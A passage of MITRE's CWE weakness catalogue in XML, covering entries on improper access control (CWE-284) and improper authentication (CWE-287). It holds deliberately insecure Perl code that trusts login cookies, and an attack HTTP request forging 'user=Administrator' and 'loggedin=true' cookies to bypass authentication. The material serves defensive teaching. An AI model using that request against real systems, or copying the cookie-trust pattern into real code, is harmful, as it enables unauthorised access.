               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Missing Access Control</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP35</Entry_ID>
               <Entry_Name>Insecure resource access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
            <Related_Attack_Pattern CAPEC_ID="87"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page&#xA;                  39."/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 11, &#34;ACL Inheritance&#34;, Page 649."/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-24</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Changed name and description; clarified difference between "access control" and "authorization."</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Demonstrative_Examples, Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2009-01-12">Missing or Inconsistent Access Control</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Improper Access Control (Authorization)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="287" Name="Improper Authentication" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>When an actor claims to have a given identity, the software does not prove or insufficiently proves that the claim is correct.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>authentification</Term>
               <Description>An alternate term is "authentification", which appears to be most commonly used by people from non-English-speaking countries.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthC</Term>
               <Description>"AuthC" is typically used as an abbreviation of "authentication" within the web application security community. It is also distinct from "AuthZ," which is an abbreviation of "authorization." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an authentication framework or library such as the OWASP ESAPI Authentication feature.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $q = new CGI;<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('loggedin') ne "true") {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>ExitError("Error: you need to log in first");</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">
                              <xhtml:div># Set loggedin and user cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
                                 </xhtml:div>
                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>-name =&gt; 'user',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
                                 </xhtml:div>
                              </xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('user') eq "Administrator") {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>DoAdministratorTasks();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: user=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
                     <xhtml:br/>[body of request]</xhtml:div>
               </Example_Code>
               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force with a large number of common words. Once the attacker gained access as the member of the support staff, he used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-236"/>
               </References>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-3421</Reference>
               <Description>login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2382</Reference>
               <Description>admin script allows authentication bypass by setting a cookie value to "LOGGEDIN".</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2382</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1048</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>product uses default "Allow" action, instead of default deny, leading to authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2168</Reference>
               <Description>chain: redirect without exit (CWE-698) leads to resultant authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3107</Reference>
               <Description>product does not restrict access to a listening port for a critical service, allowing authentication to be bypassed.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1596</Reference>
               <Description>product does not properly implement a security-related configuration setting, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1596</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2422</Reference>
               <Description>authentication routine returns "nil" instead of "false" in some situations, allowing authentication bypass using an invalid username.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2422</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3232</Reference>
               <Description>authentication update script does not properly handle when admin does not select any authentication modules, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3231</Reference>
               <Description>use of LDAP authentication with anonymous binds causes empty password to result in successful authentication</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3231</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Authentication</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Error</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>1</Entry_ID>
               <Entry_Name>Insufficient Authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="114"/>
            <Related_Attack_Pattern CAPEC_ID="151"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="593"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-237"/>
            <Reference External_Reference_ID="REF-238"/>
            <Reference External_Reference_ID="REF-239"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authentication&#34; Page 109"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be resultant from SQL injection vulnerabilities and other issues.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
